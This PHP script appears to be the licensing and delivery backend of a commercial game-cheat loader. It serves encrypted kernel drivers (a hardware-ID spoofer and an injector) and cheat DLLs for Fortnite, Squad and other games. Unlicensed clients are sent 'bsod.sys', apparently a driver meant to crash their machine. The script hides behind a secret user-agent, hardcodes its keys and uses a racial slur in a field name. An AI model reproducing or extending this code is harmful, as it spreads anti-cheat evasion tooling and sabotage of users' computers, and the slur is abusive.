<?php

include_once("auth/deps/config.php");

error_reporting(0);

function check_hwid($license_data, $hwid){
    global $con;

    if ($license_data["hwid"] != $hwid) {
        return "invalid_hwid";
    }

    return "success";
}

function fetch_license($license){
    global $con;

    $l_query = $con->query("SELECT * FROM licenses WHERE license=?", $license);

    if($l_query->numRows() > 0) {
        return $l_query->fetch();
    }

    return "invalid_license";
}

function update_sub($license_data){
    global $con;

    if ($license_data["days"] == '0.0.0.5') //0.0.0.5 means 3 hour keys kekw
        $final_timestamp = strtotime("+3 hours");
    else {
        $final_timestamp = strtotime("+" . $license_data["days"] . " days");
    }

    $con->query("UPDATE licenses SET expiry=? WHERE license=?", [$final_timestamp, $license_data["license"]]);

    return "success";
}

function check_sub($license_data){
    if ($license_data["expiry"] == 0) {
        return update_sub($license_data);
    }

    if ($license_data["expiry"] > time()) {
        return "success";
    }

    return "expired_sub";
}

function login($license, $hwid) {
    $license_data = fetch_license($license);

    if($license_data == "invalid_license") {
        return $license_data;
    }

    if ($license_data["banned"] == 1) {
        return "banned_license";
    }

    $uc_sub = check_sub($license_data);

    if($uc_sub != "success") {
        return $uc_sub;
    }

    $uc_hwid = check_hwid($license_data, $hwid);

    if ($uc_hwid != "success") {
        return $uc_hwid;
    }

    return "logged_in";
}

class Encryption {
    private static $method = 'aes-256-cbc';
    public static $static_encryption_key = "Uk5UlAjExY7GryC2pTZJQLkEdsHfBwEX";
    public static $static_iv_key = "nlfVITiqSuPy4p9U";

    function __construct($enc_key, $iv_key = null, $sha_mode = true){
        $this->enc_key = ($sha_mode) ?
            substr(hash('sha256', $enc_key), 0, 32) : $enc_key;

        if(strlen($this->enc_key) !== 32)
            throw new Exception('wrong key length');

        $this->iv_key = substr($iv_key, 0, 16);
    }

    public static function encrypt($message, $custom_iv = null){
        if ($custom_iv === null && strlen(self::$static_iv_key) !== 16)
            throw new Exception('not valid iv length');

        $used_iv = $custom_iv ?? self::$static_iv_key;

        $encrypted_string = openssl_encrypt($message, self::$method, self::$static_encryption_key, true, $used_iv);

        return bin2hex($encrypted_string);
    }

    public static function decrypt($message, $custom_iv = null){
        $message = hex2bin($message);

        if($custom_iv === null && strlen(self::$static_iv_key) !== 16)
            throw new Exception('not valid iv length');

        $used_iv = $custom_iv ?? self::$static_iv_key; //custom iv has priority

        return openssl_decrypt($message, self::$method, self::$static_encryption_key, true, $used_iv);
    }

    public static function EncodeArray($mode, $random_iv, $key, $hwid) {
        $file_contents = null;

        if (login($key, $hwid) != "logged_in") {
            $file_contents = file_get_contents(__DIR__ . "/OWINRSUAODNDJIIAOOQN/bsod.sys");
            return self::encrypt($file_contents, $random_iv);
        }

        if ($mode == "1") {
            $file_contents = file_get_contents(__DIR__ . "/OWINRSUAODNDJIIAOOQN/spoofdrv.sys");
        } else if ($mode == "34") {
            $file_contents = file_get_contents(__DIR__ . "/OWINRSUAODNDJIIAOOQN/InternInjectDRV.sys");
        } else if ($mode == "53") {
            $file_contents = file_get_contents(__DIR__ . "/OWINRSUAODNDJIIAOOQN/CWFortniteRageIntern.dll");
        } else if ($mode == "8273") {
            $file_contents = file_get_contents(__DIR__ . "/OWINRSUAODNDJIIAOOQN/SplitgateInternal.dll");
        } else if ($mode == "947378") {
            $file_contents = file_get_contents(__DIR__ . "/OWINRSUAODNDJIIAOOQN/RogueCompanyInternal.dll");
        } else if ($mode == "3648374") {
            $file_contents = file_get_contents(__DIR__ . "/OWINRSUAODNDJIIAOOQN/SpellbreakInternal.dll");
        } else if ($mode == "74638472") {
            $file_contents = file_get_contents(__DIR__ . "/OWINRSUAODNDJIIAOOQN/TheCycleInternal.dll");
        } else if ($mode == "67583847") {
            $file_contents = file_get_contents(__DIR__ . "/OWINRSUAODNDJIIAOOQN/ScavengersInternal.dll");
        } else if ($mode == "847389332") {
            $file_contents = file_get_contents(__DIR__ . "/OWINRSUAODNDJIIAOOQN/SquadInternal.dll");
        } else if ($mode == "2636492834") {
            $file_contents = "160167744";
        }

        try {
            return self::encrypt($file_contents, $random_iv);
        } catch (Exception $e) {
            echo 'Caught exception';
        }
    }
}

class Utils
{
    public static function Redirect($url, $permanent = false)
    {
        header('Location: ' . $url, true, $permanent ? 301 : 302);

        exit();
    }

    public static function HandleUnauthedVisit()
    {
        self::Redirect('https://pornhub.com/', false);
        return 0;
    }
}

// checks here
if($_SERVER["HTTP_USER_AGENT"] != 'strawLAMJD9281KAJ18') {
    $check = Utils::HandleUnauthedVisit();
} else {
    // check if key is valid here ( need to add api for it )
    if (!$_POST["mode"])
        Utils::HandleUnauthedVisit();
    else {
        $mode = $_POST["mode"];
        $key = $_POST["authentication_token"];
        $hwid = $_POST["user_hwid"];

        if (!$key || !$hwid) {
            Utils::HandleUnauthedVisit();
            return;
        }
        if (!$_POST["dynamic_shit"])
            Utils::HandleUnauthedVisit();
        else {
            $random_dynamic_iv = $_POST["dynamic_shit"];
            try {
                $random_dynamic_iv = Encryption::decrypt($random_dynamic_iv, "^#j?)<z?*J.SsmUT");
            } catch (Exception $e) {
                Utils::HandleUnauthedVisit();
            }
            if (!$_POST["secret_code_nigga"])
                Utils::HandleUnauthedVisit();
            else {
                try {
                    $encrypted_byte_string = Encryption::EncodeArray($mode, $random_dynamic_iv, $key, $hwid);
                    echo $encrypted_byte_string;
                } catch (Exception $ex) {
                    Utils::HandleUnauthedVisit();
                }
            }
        }
}
}